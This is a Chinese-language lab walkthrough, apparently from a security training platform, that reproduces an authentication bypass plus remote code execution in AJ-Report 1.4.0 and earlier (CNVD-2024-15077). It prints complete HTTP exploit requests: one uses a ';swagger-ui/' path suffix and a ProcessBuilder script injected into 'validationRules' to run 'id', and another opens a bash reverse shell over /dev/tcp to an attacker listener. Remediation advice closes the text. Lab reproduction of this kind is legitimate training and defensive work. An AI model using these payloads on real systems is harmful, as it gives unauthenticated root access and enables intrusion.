# AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）

> [英文文档](README_EN.md)

| 属性 | 详情 |
|------|------|
| 漏洞编号 | CNVD-2024-15077 |
| 影响版本 | AJ-Report ≤ 1.4.0 |
| 漏洞类型 | 认证绕过 + 远程代码执行（RCE） |
| 危险等级 | 🔴 严重 |
| 默认凭据 | 无需认证 |
| 利用条件 | 可访问目标服务（默认端口 9095），无需任何账号 |

AJ-Report 是一款全开源的 BI（商业智能）报表平台，广泛用于企业数据可视化与报表展示。在 1.4.0 及更早版本中，`/dataSetParam/verification` 接口存在严重的认证绕过漏洞：攻击者通过在 URL 路径末尾追加 `;swagger-ui/` 后缀，可绕过 Spring Security 的权限拦截，无需登录直接访问受保护接口。

该接口的 `validationRules` 参数支持执行 JavaScript 脚本，且脚本引擎可直接调用 `java.lang.ProcessBuilder` 等 Java 原生类。攻击者通过构造恶意 `validationRules` 内容，即可在服务端以 `root` 权限执行任意系统命令，实现完整的远程代码执行（RCE）。

漏洞危害极高：由于无需任何认证即可触发，暴露在公网的 AJ-Report 实例可被任意攻击者直接利用，获取服务器 Shell 并进一步横向渗透。

## 漏洞复现

### 准备工作

靶机启动后，访问 `http://your-ip:9095` 可以看到 AJ-Report 的登录页面，确认服务正常运行。

![访问 AJ-Report 登录页面](https://static.nextcyber.cn/attachments/images/course/task/4574ea71cf4e416591685b344c3a280a.png)

使用 `Burp Suite` 抓取登录页面的请求流量，并将数据包发送到 **Repeater**（重放）模块，准备构造恶意数据包。

![Burp Suite 抓包并发送到 Repeater](https://static.nextcyber.cn/attachments/images/course/task/92e449f36bc54116a42358eb42282848.png)

### 步骤一：认证绕过执行 `id` 命令

构造如下数据包，通过 `;swagger-ui/` 后缀绕过认证，并在 `validationRules` 中注入 `java.lang.ProcessBuilder` 执行 `id` 命令：

```http
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

在 `Burp Suite` 中发送该请求，响应中可以看到命令执行成功，当前用户为 `root`。

![执行 id 命令，返回 root 用户](https://static.nextcyber.cn/attachments/images/course/task/b2541a38d18b4d9698fdaca5ef10f893.png)

### 步骤二：反弹 Shell

> [!NOTE]
> 在攻击机（Kali）上提前开启监听端口，再发送反弹 Shell 数据包。

在攻击机上启动 `nc` 监听：

```bash
┌──(root㉿nextcyber)-[~]
└─# nc -lvnp 7777
listening on [any] 7777 ...
```

将数据包中的 `validationRules` 修改为反弹 Shell payload，目标地址替换为攻击机 IP（本例为 `192.168.2.6`），端口为 `7777`：

```http
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/192.168.2.6/7777 0>&1\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

在 `Burp Suite` 中发送修改后的数据包，攻击机的 `nc` 监听端成功接收到反弹 Shell，用户为 `root`。

![成功获取反弹 Shell，用户为 root](https://static.nextcyber.cn/attachments/images/course/task/a388f9101f5e4fbb9e4557fc3df8f401.png)

## 修复建议

1. **升级至最新版本**：官方已在后续版本中修复该认证绕过漏洞，请立即升级 AJ-Report 至最新稳定版。
2. **限制外网访问**：将 AJ-Report 管理界面绑定至内网地址，或通过防火墙规则禁止公网直接访问 9095 端口。
3. **禁用脚本引擎中的危险 Java 类**：对 `validationRules` 字段的脚本执行环境进行沙箱限制，禁止调用 `ProcessBuilder`、`Runtime` 等高危 Java 类。
4. **部署 WAF**：在应用前置部署 Web 应用防火墙，检测并拦截包含 `;swagger-ui/` 等路径混淆特征的请求。
5. **最小权限原则**：以非 `root` 用户运行 AJ-Report 服务，降低漏洞被利用后的影响范围。
